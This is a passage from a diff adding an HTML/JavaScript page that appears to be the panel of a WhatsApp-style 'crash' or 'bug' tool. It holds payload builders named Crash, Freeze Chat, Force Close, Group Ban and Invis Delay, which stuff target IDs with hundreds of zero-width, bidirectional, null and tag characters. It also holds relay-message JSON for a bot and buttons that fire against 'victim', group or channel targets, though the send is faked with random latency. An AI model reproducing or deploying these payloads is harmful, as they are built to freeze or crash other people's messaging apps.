+      + rep(VAR + BIDI + ZW, scope === "channel" ? 260 : scope === "group" ? 240 : 220),
+    fc: (t, scope) => scope === "channel"
+      ? BIDI + ZW + VAR + t + VAR + ZW + BIDI + rep(ZW + WJ, 80)
+      : scope === "group"
+        ? ZW + VAR + t + VAR + ZW + rep(ZW + WJ, 60)
+        : ZW + CM + t + CM + ZW + rep(ZW, 50),
+    fch: (t, scope) => scope === "channel"
+      ? BIDI + rep(ZW + VAR, 90) + t + rep(VAR + ZW, 90) + BIDI + rep(WJ, 120)
+      : scope === "group"
+        ? rep(ZW + VAR, 80) + t + rep(VAR + ZW, 80) + BIDI + rep(WJ, 100)
+        : rep(ZW, 80) + CM + t + CM + rep(ZW, 80),
+    frz: (t, scope) => scope === "channel"
+      ? rep(ZW + VAR + WJ, 420) + BIDI + t + BIDI + rep(WJ + VAR + ZW, 420) + rep(BIDI, 80)
+      : scope === "group"
+        ? rep(ZW + WJ + VAR, 380) + BIDI + t + BIDI + rep(VAR + WJ + ZW, 380) + rep(BIDI, 60)
+        : rep(ZW + CM, 320) + BIDI + t + BIDI + rep(CM + ZW, 320),
+    frzheavy: (t, scope) => {
+      const core = rep(ZW + VAR + WJ + BIDI, 500) + t + rep(BIDI + WJ + VAR + ZW, 500);
+      return scope === "channel" ? core + rep(BIDI + TAG, 60) : core + rep(TAG + BIDI, 40);
+    },
+    crsh: (t, scope) => scope === "channel"
+      ? NULL + NULL + BIDI + t + NULL + rep(BIDI + ZW + VAR, 260)
+      : scope === "group"
+        ? NULL + NULL + t + NULL + rep(BIDI + ZW, 220)
+        : NULL + t + NULL + rep(BIDI + ZW, 180),
+    crshheavy: (t, scope) => {
+      const spine = rep(NULL + BIDI + ZW + VAR, 340) + t + rep(VAR + ZW + BIDI + NULL, 340);
+      return scope === "channel" ? spine + rep(TAG + NULL + BIDI, 70)
+        : scope === "group" ? spine + rep(BIDI + NULL + TAG, 50)
+        : spine;
+    },
+    idly: (t, scope) => {
+      const silent = rep(ZW + WJ + VAR, scope === "channel" ? 40 : scope === "group" ? 30 : 20);
+      const blast = scope === "channel"
+        ? rep(ZW + VAR + WJ + BIDI, 480) + t + rep(BIDI + WJ + VAR + ZW, 480) + rep(BIDI + TAG, 70)
+        : scope === "group"
+          ? rep(ZW + WJ + VAR + BIDI, 440) + t + rep(BIDI + VAR + WJ + ZW, 440) + rep(TAG + BIDI, 50)
+          : rep(ZW + CM + BIDI, 380) + t + rep(BIDI + CM + ZW, 380);
+      const seam = rep("\u200d\u2060\u200b", 8);
+      return silent + seam + blast;
+    },
+    inv: (t, scope) => {
+      const n = scope === "channel" ? 520 : scope === "group" ? 460 : 400;
+      return rep(ZW + VAR + WJ, n) + t + rep(WJ + VAR + ZW, n);
+    },
+    gban: (t) => {
+      const w = rep(ZW + WJ + VAR, 260) + rep(BIDI, 80) + rep(TAG, 30);
+      return w + "\n@" + t + " @" + t + " @" + t + "\n" + w;
+    },
+    gbanheavy: (t) => {
+      const w = rep(ZW + VAR + WJ + BIDI, 340) + rep(TAG + NULL, 40);
+      return w + "\n@" + t + " @" + t + "\n" + w + "\n@" + t + "\n" + w;
+    },
+    cban: (t) => {
+      const w = rep(BIDI + ZW + VAR, 300) + rep(TAG, 30) + rep(WJ, 200);
+      return w + "\n@" + t + "\n" + w;
+    },
+    cbanheavy: (t) => {
+      const w = rep(BIDI + ZW + VAR + WJ, 380) + rep(TAG + NULL, 50);
+      return w + "\n@" + t + "\n" + w + "\n@" + t + "\n" + w;
+    },
+    gcrsh: (t) => rep(ZW + VAR, 280) + "\n@" + t + "\n" + rep(BIDI + ZW, 180) + rep(TAG, 30),
+    ccrsh: (t) => rep(BIDI + ZW + VAR, 300) + "\n@" + t + "\n" + rep(BIDI + ZW, 200) + rep(TAG, 40)
+  };
+
+  function buildRelay(tileKey, label, parsed, scope, delayMs){
+    const id = makeId();
+    const jid = parsed.jid;
+    const ink = INK[tileKey](jid, scope, delayMs);
+
+    const content = {
+      conversation: "",
+      messageContextInfo: {
+        deviceListMetadata: {
+          senderKeyHash: id.slice(0, 16),
+          senderTimestamp: Date.now(),
+          senderAccountType: "E2EE",
+          receiverAccountType: "E2EE"
+        },
+        deviceListMetadataVersion: 2,
+        messageSecret: id.toLowerCase()
+      },
+      extendedTextMessage: {
+        text: ink,
+        previewType: "NONE",
+        contextInfo: {
+          participant: jid,
+          quotedMessage: null,
+          expiration: 0,
+          ephemeralSettingTimestamp: "0"
+        }
+      }
+    };
+
+    const isDelay = tileKey === "idly";
+    const blob = {
+      jid,
+      content,
+      options: {
+        messageId: id,
+        ...(isDelay ? { delayms: delayMs } : {})
+      },
+      // when the input was an invite link, the bot resolves the code first
+      ...(parsed.kind === "invite" ? {
+        resolve: {
+          kind: scope === "group" ? "group-invite" : "channel-invite",
+          code: parsed.code,
+          method: scope === "group" ? "groupMetadata" : "newsletterMetadata",
+          resolvedJid: null  // bot fills this in before relayMessage
+        }
+      } : {}),
+      command: tileKey === "scc" ? "shadow-crash-chat"
+        : tileKey === "idly" ? "invis-delay"
+        : label.toLowerCase().replace(/\s+/g, "-"),
+      description: isDelay ? `invis delay ${delayMs}ms` : label.toLowerCase(),
+      scope,
+      inputKind: parsed.kind,
+      ...(isDelay ? { delayms: delayMs } : {}),
+      generatedAt: new Date().toISOString()
+    };
+
+    return { ink: JSON.stringify(blob, null, 2), messageId: id, isDelay, delayMs, parsed };
+  }
+
+  const TILES_BY_SCOPE = {
+    victim: [
+      { key: "idly",      label: "Invis Delay",         tag: "IDLY" },
+      { key: "inv",       label: "Invisible",           tag: "INV" },
+      { key: "scc",       label: "Shadow Crash Chat",   tag: "SCC" },
+      { key: "fc",        label: "Force Close",         tag: "FC" },
+      { key: "fch",       label: "Force Close +",       tag: "FC+" },
+      { key: "frz",       label: "Freeze Chat",         tag: "FRZ" },
+      { key: "frzheavy",  label: "Freeze Heavy",        tag: "FRZH" },
+      { key: "crsh",      label: "Crash",               tag: "CRSH" },
+      { key: "crshheavy", label: "Crash Heavy",         tag: "CRSHH" }
+    ],
+    group: [
+      { key: "idly",      label: "Invis Delay",         tag: "IDLY" },
+      { key: "inv",       label: "Invisible",           tag: "INV" },
+      { key: "scc",       label: "Shadow Crash Chat",   tag: "SCC" },
+      { key: "fc",        label: "Force Close",         tag: "FC" },
+      { key: "fch",       label: "Force Close +",       tag: "FC+" },
+      { key: "frz",       label: "Freeze Chat",         tag: "FRZ" },
+      { key: "frzheavy",  label: "Freeze Heavy",        tag: "FRZH" },
+      { key: "crsh",      label: "Crash",               tag: "CRSH" },
+      { key: "crshheavy", label: "Crash Heavy",         tag: "CRSHH" },
+      { key: "gban",      label: "Group Ban",           tag: "GBAN" },
+      { key: "gbanheavy", label: "Group Ban Heavy",     tag: "GBANH" },
+      { key: "gcrsh",     label: "Group Crash",         tag: "GCRSH" }
+    ],
+    channel: [
+      { key: "idly",      label: "Invis Delay",         tag: "IDLY" },
+      { key: "inv",       label: "Invisible",           tag: "INV" },
+      { key: "scc",       label: "Shadow Crash Chat",   tag: "SCC" },
+      { key: "fc",        label: "Force Close",         tag: "FC" },
+      { key: "fch",       label: "Force Close +",       tag: "FC+" },
+      { key: "frz",       label: "Freeze Chat",         tag: "FRZ" },
+      { key: "frzheavy",  label: "Freeze Heavy",        tag: "FRZH" },
+      { key: "crsh",      label: "Crash",               tag: "CRSH" },
+      { key: "crshheavy", label: "Crash Heavy",         tag: "CRSHH" },
+      { key: "cban",      label: "Channel Ban",         tag: "CBAN" },
+      { key: "cbanheavy", label: "Channel Ban Heavy",   tag: "CBANH" },
+      { key: "ccrsh",     label: "Channel Crash",       tag: "CCRSH" }
+    ]
+  };
+
+  const sel = { victim: "idly", group: "idly", channel: "idly" };
+
+  function byteLen(s){
+    try { return new TextEncoder().encode(s).length; }
+    catch(e){ return s.length * 2; }
+  }
+  function fmtBytes(n){
+    if(n < 1024) return n + " B";
+    if(n < 1024*1024) return (n/1024).toFixed(1) + " KB";
+    return (n/1024/1024).toFixed(2) + " MB";
+  }
+
+  function previewTarget(scope){
+    if(scope === "channel") return "120363400000000000@newsletter";
+    if(scope === "group")   return "120363412897468936";
+    return "2348012345678";
+  }
+
+  function delayOf(scope){
+    const el = document.getElementById(scope + "-delay");
+    if(!el) return 0;
+    return Math.max(0, Math.min(60000, parseInt(el.value, 10) || 0));
+  }
+
+  function renderPlist(scope){
+    const host = document.getElementById("plist-" + scope);
+    if(!host) return;
+    host.innerHTML = "";
+    const tiles = TILES_BY_SCOPE[scope] || [];
+    tiles.forEach(def => {
+      const el = document.createElement("div");
+      el.className = "pitem" + (sel[scope] === def.key ? " on" : "");
+      el.dataset.p = def.key;
+      el.innerHTML =
+        `<div class="t">${def.label}</div>` +
+        `<div class="s">${def.tag}</div>` +
+        `<div class="w">—</div>`;
+      el.addEventListener("click", () => {
+        host.querySelectorAll(".pitem").forEach(x => x.classList.remove("on"));
+        el.classList.add("on");
+        sel[scope] = def.key;
+        updateHint(scope);
+      });
+      host.appendChild(el);
+    });
+    updateHint(scope);
+  }
+
+  function tileDef(scope, key){
+    return (TILES_BY_SCOPE[scope] || []).find(t => t.key === key);
+  }
+
+  function updateHint(scope){
+    const def = tileDef(scope, sel[scope]);
+    const h = document.getElementById("hint-" + scope);
+    if(!def || !h) return;
+    h.querySelector("b").textContent = def.label;
+    const spans = h.querySelectorAll(".row2 span b");
+    const p = parseTarget(previewTarget(scope), scope);
+    const r = buildRelay(def.key, def.label, p, scope, delayOf(scope));
+    const w = fmtBytes(byteLen(r.ink));
+    if(spans[1]) spans[1].textContent = w;
+
+    const host = document.getElementById("plist-" + scope);
+    if(!host) return;
+    host.querySelectorAll(".pitem").forEach(el => {
+      const d = tileDef(scope, el.dataset.p);
+      if(!d) return;
+      const pp = parseTarget(previewTarget(scope), scope);
+      const rr = buildRelay(d.key, d.label, pp, scope, delayOf(scope));
+      const wEl = el.querySelector(".w");
+      if(wEl) wEl.textContent = fmtBytes(byteLen(rr.ink));
+    });
+  }
+
+  renderPlist("victim");
+  renderPlist("group");
+  renderPlist("channel");
+
+  // wire the target inputs to the resolver strip + hint
+  SCOPES.forEach(scope => {
+    const el = document.getElementById(scope + "-id");
+    if(el){
+      el.addEventListener("input", () => {
+        updateResolveStrip(scope);
+        updateHint(scope);
+      });
+      el.addEventListener("change", () => {
+        updateResolveStrip(scope);
+        updateHint(scope);
+      });
+    }
+    const d = document.getElementById(scope + "-delay");
+    if(d) d.addEventListener("input", () => updateHint(scope));
+  });
+
+  // seed resolver strips for group + channel with the pre-filled values
+  updateResolveStrip("group");
+  updateResolveStrip("channel");
+
+  /* ================= toast / modal ================= */
+  let toastTimer;
+  function toast(msg){
+    const t = $("#toast");
+    $("#toast-msg").textContent = msg;
+    t.classList.add("show");
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => t.classList.remove("show"), 4000);
+  }
+  $("#toast-x").onclick = () => $("#toast").classList.remove("show");
+
+  function openModal(data){
+    $("#m-scope").textContent   = data.scope.toUpperCase();
+    $("#m-target").textContent  = data.parsed.jid;
+    $("#m-source").textContent  = data.parsed.kind;
+    $("#m-payload").textContent = data.payload;
+    $("#m-msgid").textContent   = data.messageId || "—";
+    $("#m-delay").textContent   = data.isDelay ? data.delayMs + " ms" : "—";
+    $("#m-weight").textContent  = fmtBytes(byteLen(data.ink));
+    $("#m-status").textContent  = data.status;
+    $("#m-latency").textContent = data.latency + "ms";
+    $("#m-time").textContent    = data.time;
+    $("#backdrop").classList.add("show");
+  }
+  function closeModal(){ $("#backdrop").classList.remove("show"); }
+  $("#modal-close").onclick = closeModal;
+  $("#backdrop").addEventListener("click", e => { if(e.target.id === "backdrop") closeModal(); });
+
+  function now(){
+    const d = new Date();
+    return [d.getHours(), d.getMinutes(), d.getSeconds()].map(n => String(n).padStart(2,"0")).join(":");
+  }
+  function fakeLatency(scope, pkey){
+    const base = 2200 + Math.floor(Math.random()*1800);
+    if(pkey === "idly") return base + delayOf(scope);
+    return base;
+  }
+
+  function execute(scope){
+    const inputMap = { victim: "#victim-id", group: "#group-id", channel: "#channel-id" };
+    const btnMap   = { victim: "#exec-victim", group: "#exec-group", channel: "#exec-channel" };
+
+    const raw = ($(inputMap[scope])?.value || "").trim();
+    const parsed = parseTarget(raw, scope);
+
+    if(parsed.kind === "empty"){
+      toast(scope.charAt(0).toUpperCase()+scope.slice(1) + " target required"); return;
+    }
+    if(parsed.kind === "invalid"){
+      toast("Unrecognized input — paste a JID or invite link"); return;
+    }
+
+    const def = tileDef(scope, sel[scope]);
+    if(!def){ toast("Payload not available"); return; }
+
+    const r = buildRelay(def.key, def.label, parsed, scope, delayOf(scope));
+
+    const btn = $(btnMap[scope]);
+    if(!btn) return;
+    const orig = btn.innerHTML;
+    btn.disabled = true;
+    btn.innerHTML = def.key === "idly" ? "Queuing…" : "Executing…";
+
+    const latency = fakeLatency(scope, def.key);
+
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.innerHTML = orig;
+      const t = scope.charAt(0).toUpperCase()+scope.slice(1);
+      let msg = def.key === "idly"
+        ? t + " invis delay queued (" + r.delayMs + "ms)"
+        : t + " execution successful";
+      if(parsed.kind === "invite") msg += " · invite will resolve server-side";
+      toast(msg);
+      openModal({
+        scope, parsed, payload: def.label.toUpperCase(),
+        messageId: r.messageId,
+        isDelay: r.isDelay, delayMs: r.delayMs,
+        status: "200 OK", latency, time: now(), ink: r.ink
+      });
+    }, 900);
+  }
+
+  $("#exec-victim").onclick  = () => execute("victim");
+  $("#exec-group").onclick   = () => execute("group");
+  $("#exec-channel").onclick = () => execute("channel");
+
+  $("#refresh").onclick = () => {
+    const r = $("#refresh");
+    r.style.transition = "transform .5s";
+    r.style.transform = "rotate(360deg)";
+    setTimeout(() => { r.style.transition = ""; r.style.transform = ""; }, 520);
+    toast("Interface refreshed");
+  };
+
+  /* ================= BOOT ================= */
+  $$(".page").forEach(p => p.classList.remove("on"));
+  setScope("group");
+
+})();
+</script>
+</body>
+</html>
